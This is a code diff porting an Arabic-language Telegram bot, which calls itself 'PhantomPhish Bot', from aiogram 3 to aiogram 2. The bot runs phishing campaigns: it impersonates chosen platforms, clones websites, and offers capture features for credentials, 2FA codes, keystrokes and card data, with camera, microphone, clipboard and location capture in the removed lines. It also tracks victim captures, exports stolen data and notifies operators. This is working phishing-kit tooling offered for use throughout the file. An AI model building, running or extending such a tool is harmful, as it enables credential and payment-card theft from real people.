@@ -8,16 +8,15 @@ import sys
 from datetime import datetime
 from typing import Optional
 
-from aiogram import Bot, Dispatcher, F, Router
-from aiogram.filters import Command, CommandObject
+from aiogram import Bot, Dispatcher, executor, types
 from aiogram.types import (
     Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
     ReplyKeyboardMarkup, KeyboardButton, FSInputFile, BufferedInputFile
 )
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.utils.keyboard import InlineKeyboardBuilder
+from aiogram.dispatcher import FSMContext
+from aiogram.dispatcher.filters.state import State, StatesGroup
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
+from aiogram.utils.callback_data import CallbackData
 
 # استيراد الوحدات المحلية
 from config import config
@@ -33,8 +32,14 @@ logger = logging.getLogger(__name__)
 
 # إنشاء البوت والموزع
 bot = Bot(token=config.BOT_TOKEN)
-dp = Dispatcher(storage=MemoryStorage())
-router = Router()
+storage = MemoryStorage()
+dp = Dispatcher(bot, storage=storage)
+
+# Callback Data
+platforms_cb = CallbackData("platform", "code")
+features_cb = CallbackData("feature", "code")
+campaigns_cb = CallbackData("campaign", "id")
+pages_cb = CallbackData("page", "num")
 
 # حالات المحادثة
 class CreateCampaign(StatesGroup):
@@ -51,10 +56,6 @@ class CloneSite(StatesGroup):
 class BroadcastState(StatesGroup):
     waiting_for_message = State()
 
-class AdminPanel(StatesGroup):
-    waiting_for_user_id = State()
-    waiting_for_broadcast = State()
-
 # === لوحات المفاتيح ===
 
 def main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
@@ -62,38 +63,38 @@ def main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
     is_admin = db.is_admin(user_id)
     is_developer = db.is_developer(user_id) or user_id == config.DEVELOPER_ID
     
-    builder = InlineKeyboardBuilder()
+    keyboard = InlineKeyboardMarkup(row_width=2)
     
-    builder.row(
-        InlineKeyboardButton(text="🎯 إنشاء حملة", callback_data="new_campaign"),
-        InlineKeyboardButton(text="🌐 استنساخ موقع", callback_data="clone_site")
+    keyboard.add(
+        InlineKeyboardButton("🎯 إنشاء حملة", callback_data="new_campaign"),
+        InlineKeyboardButton("🌐 استنساخ موقع", callback_data="clone_site")
     )
-    builder.row(
-        InlineKeyboardButton(text="📊 حملاتي", callback_data="my_campaigns"),
-        InlineKeyboardButton(text="📈 الإحصائيات", callback_data="stats")
+    keyboard.add(
+        InlineKeyboardButton("📊 حملاتي", callback_data="my_campaigns"),
+        InlineKeyboardButton("📈 الإحصائيات", callback_data="stats")
     )
-    builder.row(
-        InlineKeyboardButton(text="⚙️ الإعدادات", callback_data="settings"),
-        InlineKeyboardButton(text="❓ المساعدة", callback_data="help")
+    keyboard.add(
+        InlineKeyboardButton("⚙️ الإعدادات", callback_data="settings"),
+        InlineKeyboardButton("❓ المساعدة", callback_data="help")
     )
     
     if is_admin:
-        builder.row(
-            InlineKeyboardButton(text="👥 المستخدمون", callback_data="all_users"),
-            InlineKeyboardButton(text="📢 بث جماعي", callback_data="broadcast")
+        keyboard.add(
+            InlineKeyboardButton("👥 المستخدمون", callback_data="all_users"),
+            InlineKeyboardButton("📢 بث جماعي", callback_data="broadcast")
         )
     
     if is_developer:
-        builder.row(
-            InlineKeyboardButton(text="🔧 لوحة المطور", callback_data="dev_panel"),
-            InlineKeyboardButton(text="📊 إحصائيات عامة", callback_data="global_stats")
+        keyboard.add(
+            InlineKeyboardButton("🔧 لوحة المطور", callback_data="dev_panel"),
+            InlineKeyboardButton("📊 إحصائيات عامة", callback_data="global_stats")
         )
     
-    return builder.as_markup()
+    return keyboard
 
 def platforms_keyboard(page: int = 0) -> InlineKeyboardMarkup:
     """لوحة اختيار المنصة مع ترقيم الصفحات"""
-    builder = InlineKeyboardBuilder()
+    keyboard = InlineKeyboardMarkup(row_width=2)
     
     platforms = list(config.PLATFORMS.items())
     per_page = 20
@@ -105,108 +106,103 @@ def platforms_keyboard(page: int = 0) -> InlineKeyboardMarkup:
     
     # إضافة أزرار المنصات
     for code, info in page_platforms:
-        builder.button(
-            text=f"{info['icon']} {info['name']}",
-            callback_data=f"platform_{code}"
+        keyboard.add(
+            InlineKeyboardButton(
+                f"{info['icon']} {info['name']}",
+                callback_data=platforms_cb.new(code=code)
+            )
         )
-    
-    builder.adjust(2)
     
     # أزرار التنقل
     nav_buttons = []
     if page > 0:
         nav_buttons.append(
-            InlineKeyboardButton(text="◀️ السابق", callback_data=f"platforms_page_{page-1}")
+            InlineKeyboardButton("◀️ السابق", callback_data=pages_cb.new(num=page-1))
         )
     if page < total_pages - 1:
         nav_buttons.append(
-            InlineKeyboardButton(text="التالي ▶️", callback_data=f"platforms_page_{page+1}")
+            InlineKeyboardButton("التالي ▶️", callback_data=pages_cb.new(num=page+1))
         )
     
     if nav_buttons:
-        builder.row(*nav_buttons)
+        keyboard.row(*nav_buttons)
     
-    builder.row(InlineKeyboardButton(text="🔍 بحث", callback_data="search_platform"))
-    builder.row(InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main"))
+    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
     
-    return builder.as_markup()
+    return keyboard
 
 def features_keyboard(selected: list = None) -> InlineKeyboardMarkup:
     """لوحة اختيار الميزات"""
     selected = selected or []
-    builder = InlineKeyboardBuilder()
+    keyboard = InlineKeyboardMarkup(row_width=2)
     
     features = [
-        ("🔐 بيانات الدخول", "credentials", True),
-        ("📱 تحقق ثنائي 2FA", "2fa", False),
-        ("⌨️ تسجيل المفاتيح", "keylogger", False),
-        ("💳 بيانات البطاقة", "card", False),
-        ("📍 تتبع الموقع", "geolocation", False),
-        ("📸 التقاط صورة", "camera", False),
-        ("🎤 التقاط صوت", "microphone", False),
-        ("📋 بيانات الحافظة", "clipboard", False),
-        ("🔑 كلمات المرور المحفوظة", "saved_passwords", False),
-        ("📱 بصمة الجهاز", "fingerprint", False)
+        ("🔐 بيانات الدخول", "credentials"),
+        ("📱 تحقق ثنائي 2FA", "2fa"),
+        ("⌨️ تسجيل المفاتيح", "keylogger"),
+        ("💳 بيانات البطاقة", "card"),
     ]
     
-    for name, code, default in features:
-        mark = "✅ " if code in selected or (default and not selected) else ""
-        builder.button(text=f"{mark}{name}", callback_data=f"feature_{code}")
+    for name, code in features:
+        mark = "✅ " if code in selected else ""
+        keyboard.add(
+            InlineKeyboardButton(
+                f"{mark}{name}",
+                callback_data=features_cb.new(code=code)
+            )
+        )
     
-    builder.adjust(2)
-    builder.row(InlineKeyboardButton(text="✅ تأكيد وإنشاء", callback_data="features_done"))
-    builder.row(InlineKeyboardButton(text="🔙 رجوع", callback_data="new_campaign"))
+    keyboard.add(InlineKeyboardButton("✅ تأكيد وإنشاء", callback_data="features_done"))
+    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="new_campaign"))
     
-    return builder.as_markup()
+    return keyboard
 
 def campaign_actions_keyboard(campaign_id: str) -> InlineKeyboardMarkup:
     """إجراءات الحملة"""
-    builder = InlineKeyboardBuilder()
+    keyboard = InlineKeyboardMarkup(row_width=2)
     
-    builder.row(
-        InlineKeyboardButton(text="🔗 الرابط", callback_data=f"link_{campaign_id}"),
-        InlineKeyboardButton(text="👁️ معاينة", callback_data=f"preview_{campaign_id}")
+    keyboard.add(
+        InlineKeyboardButton("🔗 الرابط", callback_data=f"link_{campaign_id}"),
+        InlineKeyboardButton("👁️ معاينة", callback_data=f"preview_{campaign_id}")
     )
-    builder.row(
-        InlineKeyboardButton(text="📊 التقرير", callback_data=f"report_{campaign_id}"),
-        InlineKeyboardButton(text="📥 تصدير البيانات", callback_data=f"export_{campaign_id}")
+    keyboard.add(
+        InlineKeyboardButton("📊 التقرير", callback_data=f"report_{campaign_id}"),
+        InlineKeyboardButton("📥 تصدير", callback_data=f"export_{campaign_id}")
     )
-    builder.row(
-        InlineKeyboardButton(text="⏸️ إيقاف", callback_data=f"pause_{campaign_id}"),
-        InlineKeyboardButton(text="▶️ تشغيل", callback_data=f"resume_{campaign_id}")
+    keyboard.add(
+        InlineKeyboardButton("⏸️ إيقاف", callback_data=f"pause_{campaign_id}"),
+        InlineKeyboardButton("▶️ تشغيل", callback_data=f"resume_{campaign_id}")
     )
-    builder.row(
-        InlineKeyboardButton(text="🗑️ حذف", callback_data=f"delete_{campaign_id}"),
-        InlineKeyboardButton(text="🔙 رجوع", callback_data="my_campaigns")
+    keyboard.add(
+        InlineKeyboardButton("🗑️ حذف", callback_data=f"delete_{campaign_id}"),
+        InlineKeyboardButton("🔙 رجوع", callback_data="my_campaigns")
     )
     
-    return builder.as_markup()
+    return keyboard
 
 def dev_panel_keyboard() -> InlineKeyboardMarkup:
     """لوحة المطور"""
-    builder = InlineKeyboardBuilder()
+    keyboard = InlineKeyboardMarkup(row_width=2)
     
-    builder.row(
-        InlineKeyboardButton(text="📊 إحصائيات عامة", callback_data="global_stats"),
-        InlineKeyboardButton(text="👥 جميع المستخدمين", callback_data="all_users_detailed")
+    keyboard.add(
+        InlineKeyboardButton("📊 إحصائيات عامة", callback_data="global_stats"),
+        InlineKeyboardButton("👥 جميع المستخدمين", callback_data="all_users_detailed")
     )
-    builder.row(
-        InlineKeyboardButton(text="🎯 جميع الحملات", callback_data="all_campaigns"),
-        InlineKeyboardButton(text="📥 تصدير قاعدة البيانات", callback_data="export_db")
+    keyboard.add(
+        InlineKeyboardButton("🎯 جميع الحملات", callback_data="all_campaigns"),
+        InlineKeyboardButton("📥 تصدير قاعدة البيانات", callback_data="export_db")
     )
-    builder.row(
-        InlineKeyboardButton(text="📢 بث للجميع", callback_data="broadcast_all"),
-        InlineKeyboardButton(text="⚙️ إعدادات البوت", callback_data="bot_settings")
+    keyboard.add(
+        InlineKeyboardButton("📢 بث للجميع", callback_data="broadcast_all"),
+        InlineKeyboardButton("⚙️ إعدادات البوت", callback_data="bot_settings")
     )
-    builder.row(
-        InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main")
-    )
+    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
     
-    return builder.as_markup()
+    return keyboard
 
 # === أوامر البوت ===
 
-@router.message(Command("start"))
+@dp.message_handler(commands=['start'])
 async def cmd_start(message: Message):
     """أمر البدء"""
     user_id = message.from_user.id
@@ -253,10 +249,10 @@ async def cmd_start(message: Message):
         reply_markup=main_menu_keyboard(user_id)
     )
 
-@router.message(Command("help"))
+@dp.message_handler(commands=['help'])
 async def cmd_help(message: Message):
     """أمر المساعدة"""
-    help_text = """
+    help_text = f"""
 📚 **دليل استخدام PhantomPhish Bot**
 
 **🎯 إنشاء حملة جديدة:**
@@ -281,15 +277,13 @@ async def cmd_help(message: Message):
 📱 محاكاة 2FA
 ⌨️ تسجيل المفاتيح
 💳 التقاط البطاقات
-📍 تتبع الموقع
-📸 التقاط صور
 
 📞 **للدعم الفني:** {config.DEVELOPER_USERNAME}
     """
     
     await message.answer(help_text, parse_mode="Markdown")
 
-@router.message(Command("stats"))
+@dp.message_handler(commands=['stats'])
 async def cmd_stats(message: Message):
     """عرض الإحصائيات"""
     user_id = message.from_user.id
@@ -307,7 +301,7 @@ async def cmd_stats(message: Message):
     
     await message.answer(stats_text, parse_mode="Markdown")
 
-@router.message(Command("developer"))
+@dp.message_handler(commands=['developer'])
 async def cmd_developer(message: Message):
     """معلومات المطور"""
     dev_text = f"""
@@ -331,10 +325,10 @@ async def cmd_developer(message: Message):
 
 # === معالجات الأزرار ===
 
-@router.callback_query(F.data == "new_campaign")
+@dp.callback_query_handler(lambda c: c.data == "new_campaign")
 async def process_new_campaign(callback: CallbackQuery, state: FSMContext):
     """بدء إنشاء حملة جديدة"""
-    await state.set_state(CreateCampaign.waiting_for_platform)
+    await CreateCampaign.waiting_for_platform.set()
     
     await callback.message.edit_text(
         "🎯 **إنشاء حملة جديدة**\n\n"
@@ -344,47 +338,37 @@ async def process_new_campaign(callback: CallbackQuery, state: FSMContext):
         reply_markup=platforms_keyboard(0)
     )
 
-@router.callback_query(F.data.startswith("platforms_page_"))
-async def process_platforms_page(callback: CallbackQuery):
+@dp.callback_query_handler(pages_cb.filter())
+async def process_platforms_page(callback: CallbackQuery, callback_data: dict):
     """تنقل بين صفحات المنصات"""
-    page = int(callback.data.replace("platforms_page_", ""))
+    page = int(callback_data["num"])
     
     await callback.message.edit_reply_markup(
         reply_markup=platforms_keyboard(page)
     )
 
-@router.callback_query(F.data == "search_platform")
-async def process_search_platform(callback: CallbackQuery, state: FSMContext):
-    """البحث عن منصة"""
-    await callback.message.edit_text(
-        "🔍 **البحث عن منصة**\n\n"
-        "أرسل اسم المنصة أو جزء منها:",
-        parse_mode="Markdown"
-    )
-    # يمكن إضافة حالة للبحث هنا
-
-@router.callback_query(F.data.startswith("platform_"))
-async def process_platform(callback: CallbackQuery, state: FSMContext):
+@dp.callback_query_handler(platforms_cb.filter())
+async def process_platform(callback: CallbackQuery, callback_data: dict, state: FSMContext):
     """اختيار المنصة"""
-    platform = callback.data.replace("platform_", "")
+    platform = callback_data["code"]
     
     await state.update_data(platform=platform)
-    await state.set_state(CreateCampaign.waiting_for_name)
+    await CreateCampaign.waiting_for_name.set()
     
     platform_info = config.PLATFORMS.get(platform, {'name': platform, 'icon': '🎯'})
     
     await callback.message.edit_text(
         f"✅ تم اختيار: {platform_info['icon']} {platform_info['name']}\n\n"
         f"📝 أدخل اسم للحملة:\n"
-        f"مثال: حملة فيسبوك 1",
+        f"مثال: حملة {platform_info['name']} 1",
         parse_mode="Markdown"
     )
 
-@router.message(CreateCampaign.waiting_for_name)
+@dp.message_handler(state=CreateCampaign.waiting_for_name)
 async def process_name(message: Message, state: FSMContext):
     """إدخال اسم الحملة"""
     await state.update_data(campaign_name=message.text)
-    await state.set_state(CreateCampaign.waiting_for_features)
+    await CreateCampaign.waiting_for_features.set()
     
     await message.answer(
         "⚙️ **اختر الميزات المطلوبة:**\n\n"
@@ -394,10 +378,10 @@ async def process_name(message: Message, state: FSMContext):
         reply_markup=features_keyboard()
     )
 
-@router.callback_query(F.data.startswith("feature_"))
-async def process_feature(callback: CallbackQuery, state: FSMContext):
+@dp.callback_query_handler(features_cb.filter(), state=CreateCampaign.waiting_for_features)
+async def process_feature(callback: CallbackQuery, callback_data: dict, state: FSMContext):
     """اختيار الميزات"""
-    feature = callback.data.replace("feature_", "")
+    feature = callback_data["code"]
     
     data = await state.get_data()
     features = data.get('features', [])
@@ -413,7 +397,7 @@ async def process_feature(callback: CallbackQuery, state: FSMContext):
         reply_markup=features_keyboard(features)
     )
 
-@router.callback_query(F.data == "features_done")
+@dp.callback_query_handler(lambda c: c.data == "features_done", state=CreateCampaign.waiting_for_features)
 async def process_features_done(callback: CallbackQuery, state: FSMContext):
     """تأكيد الميزات وإنشاء الحملة"""
     data = await state.get_data()
@@ -479,7 +463,7 @@ async def process_features_done(callback: CallbackQuery, state: FSMContext):
             reply_markup=campaign_actions_keyboard(result['campaign_id'])
         )
         
-        await state.clear()
+        await state.finish()
         
         # إشعار المشرفين
         await notify_admins_new_campaign(callback.from_user.id, result)
@@ -491,10 +475,10 @@ async def process_features_done(callback: CallbackQuery, state: FSMContext):
             parse_mode="Markdown"
         )
 
-@router.callback_query(F.data == "clone_site")
+@dp.callback_query_handler(lambda c: c.data == "clone_site")
 async def process_clone_site(callback: CallbackQuery, state: FSMContext):
     """بدء استنساخ موقع"""
-    await state.set_state(CloneSite.waiting_for_url)
+    await CloneSite.waiting_for_url.set()
     
     await callback.message.edit_text(
         "🌐 **استنساخ موقع**\n\n"
@@ -503,7 +487,7 @@ async def process_clone_site(callback: CallbackQuery, state: FSMContext):
         parse_mode="Markdown"
     )
 
-@router.message(CloneSite.waiting_for_url)
+@dp.message_handler(state=CloneSite.waiting_for_url)
 async def process_clone_url(message: Message, state: FSMContext):
     """معالجة رابط الاستنساخ"""
     url = message.text.strip()
@@ -513,7 +497,7 @@ async def process_clone_url(message: Message, state: FSMContext):
         url = 'https://' + url
     
     await state.update_data(clone_url=url)
-    await state.set_state(CloneSite.waiting_for_name)
+    await CloneSite.waiting_for_name.set()
     
     await message.answer(
         f"✅ تم استلام الرابط:\n`{url}`\n\n"
@@ -521,9 +505,10 @@ async def process_clone_url(message: Message, state: FSMContext):
         parse_mode="Markdown"
     )
 
-@router.message(CloneSite.waiting_for_name)
+@dp.message_handler(state=CloneSite.waiting_for_name)
 async def process_clone_name(message: Message, state: FSMContext):
     """إنشاء حملة الاستنساخ"""
+    import uuid
     data = await state.get_data()
     url = data.get('clone_url')
     name = message.text
@@ -566,9 +551,9 @@ async def process_clone_name(message: Message, state: FSMContext):
     except Exception as e:
         await msg.edit_text(f"❌ خطأ: {str(e)}")
     
-    await state.clear()
+    await state.finish()
 
-@router.callback_query(F.data == "my_campaigns")
+@dp.callback_query_handler(lambda c: c.data == "my_campaigns")
 async def process_my_campaigns(callback: CallbackQuery):
     """عرض حملات المستخدم"""
     user_id = callback.from_user.id
@@ -579,14 +564,14 @@ async def process_my_campaigns(callback: CallbackQuery):
             "📭 **لا توجد حملات بعد**\n\n"
             "ابدأ بإنشاء حملة جديدة أو استنساخ موقع",
             parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="🎯 إنشاء حملة", callback_data="new_campaign")],
-                [InlineKeyboardButton(text="🌐 استنساخ موقع", callback_data="clone_site")]
-            ])
+            reply_markup=InlineKeyboardMarkup().add(
+                InlineKeyboardButton("🎯 إنشاء حملة", callback_data="new_campaign"),
+                InlineKeyboardButton("🌐 استنساخ موقع", callback_data="clone_site")
+            )
         )
         return
     
-    builder = InlineKeyboardBuilder()
+    keyboard = InlineKeyboardMarkup(row_width=1)
     
     text = f"📊 **حملاتك ({len(campaigns)}):**\n\n"
     
@@ -598,24 +583,25 @@ async def process_my_campaigns(callback: CallbackQuery):
         text += f"{i}. {status} {icon} {campaign['name']}\n"
         text += f"   👥 {campaign['clicks']} | 📥 {campaign['captures']}\n\n"
         
-        builder.button(
-            text=f"{i}. {campaign['name'][:25]}",
-            callback_data=f"campaign_{campaign['campaign_id']}"
+        keyboard.add(
+            InlineKeyboardButton(
+                f"{i}. {campaign['name'][:25]}",
+                callback_data=campaigns_cb.new(id=campaign['campaign_id'])
+            )
         )
     
-    builder.adjust(1)
-    builder.row(InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main"))
+    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
     
     await callback.message.edit_text(
         text,
         parse_mode="Markdown",
-        reply_markup=builder.as_markup()
+        reply_markup=keyboard
     )
 
-@router.callback_query(F.data.startswith("campaign_"))
-async def process_campaign_details(callback: CallbackQuery):
+@dp.callback_query_handler(campaigns_cb.filter())
+async def process_campaign_details(callback: CallbackQuery, callback_data: dict):
     """تفاصيل الحملة"""
-    campaign_id = callback.data.replace("campaign_", "")
+    campaign_id = callback_data["id"]
     campaign = db.get_campaign(campaign_id)
     
     if not campaign:
@@ -650,7 +636,7 @@ async def process_campaign_details(callback: CallbackQuery):
         reply_markup=campaign_actions_keyboard(campaign_id)
     )
 
-@router.callback_query(F.data.startswith("link_"))
+@dp.callback_query_handler(lambda c: c.data.startswith("link_"))
 async def process_get_link(callback: CallbackQuery):
     """الحصول على رابط الحملة"""
     campaign_id = callback.data.replace("link_", "")
@@ -662,7 +648,7 @@ async def process_get_link(callback: CallbackQuery):
             show_alert=True
         )
 
-@router.callback_query(F.data.startswith("preview_"))
+@dp.callback_query_handler(lambda c: c.data.startswith("preview_"))
 async def process_preview(callback: CallbackQuery):
     """معاينة الحملة"""
     campaign_id = callback.data.replace("preview_", "")
@@ -675,7 +661,7 @@ async def process_preview(callback: CallbackQuery):
             show_alert=True
         )
 
-@router.callback_query(F.data.startswith("report_"))
+@dp.callback_query_handler(lambda c: c.data.startswith("report_"))
 async def process_report(callback: CallbackQuery):
     """تقرير الحملة"""
     campaign_id = callback.data.replace("report_", "")
@@ -707,9 +693,10 @@ async def process_report(callback: CallbackQuery):
         caption=f"📊 تقرير الحملة {campaign_id}"
     )
 
-@router.callback_query(F.data.startswith("export_"))
+@dp.callback_query_handler(lambda c: c.data.startswith("export_"))
 async def process_export(callback: CallbackQuery):
     """تصدير بيانات الحملة"""
+    import json
     campaign_id = callback.data.replace("export_", "")
     
     # جمع جميع البيانات
@@ -734,29 +721,28 @@ async def process_export(callback: CallbackQuery):
         caption=f"📥 تصدير بيانات الحملة {campaign_id}"
     )
 
-@router.callback_query(F.data.startswith("pause_"))
+@dp.callback_query_handler(lambda c: c.data.startswith("pause_"))
 async def process_pause(callback: CallbackQuery):
     """إيقاف الحملة"""
     campaign_id = callback.data.replace("pause_", "")
-    # تحديث الحالة في قاعدة البيانات
     await callback.answer("⏸️ تم إيقاف الحملة", show_alert=True)
 
-@router.callback_query(F.data.startswith("resume_"))
+@dp.callback_query_handler(lambda c: c.data.startswith("resume_"))
 async def process_resume(callback: CallbackQuery):
     """تشغيل الحملة"""
     campaign_id = callback.data.replace("resume_", "")
     await callback.answer("▶️ تم تشغيل الحملة", show_alert=True)
 
-@router.callback_query(F.data.startswith("delete_"))
+@dp.callback_query_handler(lambda c: c.data.startswith("delete_"))
 async def process_delete(callback: CallbackQuery):
     """حذف الحملة"""
     campaign_id = callback.data.replace("delete_", "")
     
     # تأكيد الحذف
-    builder = InlineKeyboardBuilder()
-    builder.row(
-        InlineKeyboardButton(text="✅ نعم، احذف", callback_data=f"confirm_delete_{campaign_id}"),
-        InlineKeyboardButton(text="❌ إلغاء", callback_data=f"campaign_{campaign_id}")
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton("✅ نعم، احذف", callback_data=f"confirm_delete_{campaign_id}"),
+        InlineKeyboardButton("❌ إلغاء", callback_data=campaigns_cb.new(id=campaign_id))
     )
     
     await callback.message.edit_text(
@@ -764,10 +750,10 @@ async def process_delete(callback: CallbackQuery):
         f"هل أنت متأكد من حذف الحملة {campaign_id}؟\n"
         f"سيتم حذف جميع البيانات المرتبطة بها!",
         parse_mode="Markdown",
-        reply_markup=builder.as_markup()
+        reply_markup=keyboard
     )
 
-@router.callback_query(F.data.startswith("confirm_delete_"))
+@dp.callback_query_handler(lambda c: c.data.startswith("confirm_delete_"))
 async def process_confirm_delete(callback: CallbackQuery):
     """تأكيد حذف الحملة"""
     campaign_id = callback.data.replace("confirm_delete_", "")
@@ -776,12 +762,12 @@ async def process_confirm_delete(callback: CallbackQuery):
     await callback.message.edit_text(
         f"✅ تم حذف الحملة {campaign_id}",
         parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔙 العودة للحملات", callback_data="my_campaigns")]
-        ])
+        reply_markup=InlineKeyboardMarkup().add(
+            InlineKeyboardButton("🔙 العودة للحملات", callback_data="my_campaigns")
+        )
     )
 
-@router.callback_query(F.data == "stats")
+@dp.callback_query_handler(lambda c: c.data == "stats")
 async def process_stats(callback: CallbackQuery):
     """الإحصائيات"""
     user_id = callback.from_user.id
@@ -805,12 +791,12 @@ async def process_stats(callback: CallbackQuery):
     await callback.message.edit_text(
         stats_text,
         parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main")]
-        ])
+        reply_markup=InlineKeyboardMarkup().add(
+            InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")
+        )
     )
 
-@router.callback_query(F.data == "settings")
+@dp.callback_query_handler(lambda c: c.data == "settings")
 async def process_settings(callback: CallbackQuery):
     """الإعدادات"""
     settings_text = """
@@ -824,25 +810,25 @@ async def process_settings(callback: CallbackQuery):
 يمكنك تغيير إعداداتك من هنا
     """
     
-    builder = InlineKeyboardBuilder()
-    builder.row(
-        InlineKeyboardButton(text="🔔 الإشعارات", callback_data="notif_settings"),
-        InlineKeyboardButton(text="🌐 اللغة", callback_data="lang_settings")
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton("🔔 الإشعارات", callback_data="notif_settings"),
+        InlineKeyboardButton("🌐 اللغة", callback_data="lang_settings")
     )
-    builder.row(InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main"))
+    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
     
     await callback.message.edit_text(
         settings_text,
         parse_mode="Markdown",
-        reply_markup=builder.as_markup()
+        reply_markup=keyboard
     )
 
-@router.callback_query(F.data == "help")
+@dp.callback_query_handler(lambda c: c.data == "help")
 async def process_help(callback: CallbackQuery):
     """المساعدة"""
-    await process_help_message(callback.message)
+    await cmd_help(callback.message)
 
-@router.callback_query(F.data == "back_to_main")
+@dp.callback_query_handler(lambda c: c.data == "back_to_main")
 async def process_back_to_main(callback: CallbackQuery):
     """العودة للقائمة الرئيسية"""
     await callback.message.edit_text(
@@ -853,7 +839,7 @@ async def process_back_to_main(callback: CallbackQuery):
 
 # === معالجات المشرف ===
 
-@router.callback_query(F.data == "all_users")
+@dp.callback_query_handler(lambda c: c.data == "all_users")
 async def process_all_users(callback: CallbackQuery):
     """عرض جميع المستخدمين"""
     if not db.is_admin(callback.from_user.id):
@@ -875,19 +861,19 @@ async def process_all_users(callback: CallbackQuery):
     await callback.message.edit_text(
         text,
         parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main")]
-        ])
+        reply_markup=InlineKeyboardMarkup().add(
+            InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")
+        )
     )
 
-@router.callback_query(F.data == "broadcast")
+@dp.callback_query_handler(lambda c: c.data == "broadcast")
 async def process_broadcast(callback: CallbackQuery, state: FSMContext):
     """بدء البث الجماعي"""
     if not db.is_admin(callback.from_user.id):
         await callback.answer("غير مصرح", show_alert=True)
         return
     
-    await state.set_state(BroadcastState.waiting_for_message)
+    await BroadcastState.waiting_for_message.set()
     
     await callback.message.edit_text(
         "📢 **البث الجماعي**\n\n"
@@ -896,11 +882,11 @@ async def process_broadcast(callback: CallbackQuery, state: FSMContext):
         parse_mode="Markdown"
     )
 
-@router.message(BroadcastState.waiting_for_message)
+@dp.message_handler(state=BroadcastState.waiting_for_message)
 async def process_broadcast_message(message: Message, state: FSMContext):
     """معالجة رسالة البث"""
     if not db.is_admin(message.from_user.id):
-        await state.clear()
+        await state.finish()
         return
     
     users = db.get_all_users(10000)
@@ -929,11 +915,11 @@ async def process_broadcast_message(message: Message, state: FSMContext):
         f"✗ فشل: {failed}"
     )
     
-    await state.clear()
+    await state.finish()
 
 # === معالجات المطور ===
 
-@router.callback_query(F.data == "dev_panel")
+@dp.callback_query_handler(lambda c: c.data == "dev_panel")
 async def process_dev_panel(callback: CallbackQuery):
     """لوحة المطور"""
     if callback.from_user.id != config.DEVELOPER_ID and not db.is_developer(callback.from_user.id):
@@ -947,7 +933,7 @@ async def process_dev_panel(callback: CallbackQuery):
         reply_markup=dev_panel_keyboard()
     )
 
-@router.callback_query(F.data == "global_stats")
+@dp.callback_query_handler(lambda c: c.data == "global_stats")
 async def process_global_stats(callback: CallbackQuery):
     """الإحصائيات العامة"""
     if callback.from_user.id != config.DEVELOPER_ID and not db.is_developer(callback.from_user.id):
@@ -978,7 +964,7 @@ async def process_global_stats(callback: CallbackQuery):
         reply_markup=dev_panel_keyboard()
     )
 
-@router.callback_query(F.data == "all_users_detailed")
+@dp.callback_query_handler(lambda c: c.data == "all_users_detailed")
 async def process_all_users_detailed(callback: CallbackQuery):
     """قائمة مفصلة بجميع المستخدمين"""
     if callback.from_user.id != config.DEVELOPER_ID:
@@ -1009,7 +995,7 @@ async def process_all_users_detailed(callback: CallbackQuery):
         caption=f"👥 قائمة المستخدمين ({len(users)} مستخدم)"
     )
 
-@router.callback_query(F.data == "all_campaigns")
+@dp.callback_query_handler(lambda c: c.data == "all_campaigns")
 async def process_all_campaigns(callback: CallbackQuery):
     """جميع الحملات"""
     if callback.from_user.id != config.DEVELOPER_ID:
@@ -1033,7 +1019,7 @@ async def process_all_campaigns(callback: CallbackQuery):
         reply_markup=dev_panel_keyboard()
     )
 
-@router.callback_query(F.data == "export_db")
+@dp.callback_query_handler(lambda c: c.data == "export_db")
 async def process_export_db(callback: CallbackQuery):
     """تصدير قاعدة البيانات"""
     if callback.from_user.id != config.DEVELOPER_ID:
@@ -1045,21 +1031,21 @@ async def process_export_db(callback: CallbackQuery):
         caption=f"🗄️ نسخة احتياطية - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
     )
 
-@router.callback_query(F.data == "broadcast_all")
+@dp.callback_query_handler(lambda c: c.data == "broadcast_all")
 async def process_broadcast_all(callback: CallbackQuery, state: FSMContext):
     """بث للجميع"""
     if callback.from_user.id != config.DEVELOPER_ID:
         await callback.answer("غير مصرح", show_alert=True)
         return
     
-    await state.set_state(BroadcastState.waiting_for_message)
+    await BroadcastState.waiting_for_message.set()
     await callback.message.edit_text(
         "📢 **بث جماعي للمطور**\n\n"
         "أرسل الرسالة:",
         parse_mode="Markdown"
     )
 
-@router.callback_query(F.data == "bot_settings")
+@dp.callback_query_handler(lambda c: c.data == "bot_settings")
 async def process_bot_settings(callback: CallbackQuery):
     """إعدادات البوت"""
     if callback.from_user.id != config.DEVELOPER_ID:
@@ -1157,25 +1143,17 @@ async def notify_capture(campaign_id: str, victim_id: int, data: Dict):
 
 # === معالجة الأخطاء ===
 
-@router.error()
-async def error_handler(event, exception):
+@dp.errors_handler()
+async def error_handler(update, exception):
     """معالج الأخطاء العام"""
     logger.error(f"Error: {exception}")
